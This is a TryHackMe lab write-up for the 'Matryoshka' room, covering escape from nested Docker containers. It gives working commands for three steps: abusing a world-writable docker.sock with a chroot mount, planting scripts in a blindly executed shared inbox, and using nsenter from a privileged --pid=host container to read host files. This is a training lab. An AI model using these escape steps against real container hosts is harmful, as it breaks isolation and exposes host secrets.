# Matryoshka — TryHackMe

| | |
|---|---|
| **Difficulty** | Medium |
| **OS** | Ubuntu 24.04 host / Alpine 3.20 containers |
| **Date** | May 2026 |
| **Tags** | Docker, Container Escape, Lateral Movement, Privilege Escalation |

## Overview

Matryoshka is a container-escape room built as nested Docker layers ("Russian doll" style). Each level requires escaping the current container to reach the next, ending in a full host escape via `nsenter`.

## Recon

```bash
ssh matryoshka@<target_ip>
```

The prompt (`<random_hex>:~$`) and banner confirm we're inside a Docker container. Fingerprinting:

```bash
whoami; id; hostname; pwd
uname -a
cat /etc/os-release
```

- User: `matryoshka` (uid=1000), OS: Alpine Linux v3.20
- Host kernel visible from inside the container (`6.17.0-1013-aws`)
- `/proc/1/cgroup` and PID 1 (`sleep infinity`) confirm a long-running container, not a real host

## Enumeration

```bash
cat /proc/self/status | grep -i cap
```

`CapEff = 0` — no capabilities directly usable.

```bash
ls -la /var/run/docker.sock
# srw-rw-rw- 1 root 2375 ... /var/run/docker.sock
```

The Docker socket is world-writable — the core vulnerability for Level 1 -> Level 2.

```bash
docker images
# matryoshka-level1, alpine:3.20 -- local images available, no internet needed
```

## Exploitation — Level 1 to Level 2 (Docker Socket Escape)

```bash
docker run -v /:/mnt --rm -it alpine:3.20 chroot /mnt sh
id
# uid=0(root) -- root inside Level 2
```

**Why it worked:** the level's entrypoint script intentionally ran `chmod 666 /var/run/docker.sock`, exposing it to all users. With the socket and a local image available, mounting the host filesystem and `chroot`-ing in is a one-liner to root.

## Lateral Movement — Level 2 to Level 3 (Shared Volume Abuse)

Level 2 is itself a Docker-in-Docker container running a `dockerd` daemon and sharing `/mnt/level3share/{inbox,outbox}` with Level 3, where a `runner.sh` script blindly executes anything dropped in `inbox/`.

```bash
cat > /mnt/level3share/inbox/run.sh << 'EOF'
#!/bin/sh
find / -iname "*flag*" 2>/dev/null > /level3share/outbox/run.sh.out
grep -R "THM{" / 2>/dev/null >> /level3share/outbox/run.sh.out
EOF
chmod +x /mnt/level3share/inbox/run.sh
sleep 10
cat /mnt/level3share/outbox/run.sh.out
```

## Privilege Escalation — Host Escape

`ps aux` on Level 3 revealed it was launched with `--privileged --pid=host`, which exposes the real host's process namespace and allows entering its mount namespace via PID 1:

```bash
cat > /mnt/level3share/inbox/nsenter_flag.sh << 'EOF'
#!/bin/sh
OUT=/level3share/outbox/nsenter.out
nsenter -t 1 -m -- cat /etc/matryoshka.env > $OUT 2>&1
nsenter -t 1 -m -- find /root /home /opt /srv -name "*flag*" 2>/dev/null >> $OUT
nsenter -t 1 -m -- grep -r "THM{" /root /home /opt /srv /etc 2>/dev/null >> $OUT
EOF
chmod +x /mnt/level3share/inbox/nsenter_flag.sh
sleep 10
cat /mnt/level3share/outbox/nsenter.out
```

**Root cause:** `--pid=host` exposes the host PID namespace, and `--privileged` removes the capability restrictions that would normally block `nsenter -t 1 -m` from entering the host's mount namespace — giving read access to anything on the real host filesystem.

## Failed Attempts

| Attempt | Why it failed | Lesson |
|---|---|---|
| `docker run alpine:latest` (pull from internet) | No internet access | Check local images first (`docker images`) |
| `curl --unix-socket /var/run/docker.sock` | `curl` not installed on Alpine | Verify available tooling before relying on it |
| `docker --host tcp://172.17.0.1:2376 --tlsverify` | Cert SAN was for `.0.2`, not `.0.1` | Read certificate SANs before assuming a TLS endpoint |
| Inbox scripts without `chmod +x` | `runner.sh` won't execute non-executable files | Always set execute permission before waiting on results |

## Vulnerability Summary

| Vulnerability | Severity | Location |
|---|---|---|
| Docker socket exposed (`chmod 666`) | Critical | Level 1 -> Level 2 |
| Writable shared volume + blind script execution | High | Level 2 -> Level 3 |
| `--privileged` + `--pid=host` -> `nsenter` host escape | Critical | Level 3 -> Host |

## Attack Chain

```
SSH -> Level 1 (Alpine container)
   -> docker.sock world-writable -> chroot mount escape -> Level 2 (root)
   -> writable shared volume + blind script runner -> Level 3 (root)
   -> --privileged --pid=host -> nsenter -t 1 -m -> HOST PWNED
```

## Lessons Learned

- A randomized hostname and the presence of `/.dockerenv` are an instant signal you're inside a container — check capabilities and the Docker socket first.
- If `docker.sock` is writable and a usable image is local, the escape is effectively over.
- Always check for local images before assuming you need internet access.
- `--pid=host` combined with `--privileged` is one of the most dangerous Docker misconfigurations — it enables `nsenter -t 1 -m` straight onto the real host.
- The inbox/outbox `runner.sh` pattern is blind command injection; use it to map out the environment safely before committing to an attack.

---

Room: [TryHackMe — Matryoshka](https://tryhackme.com/room/matryoshka)
Author: Hamza Al-Najjar (Z3R0)
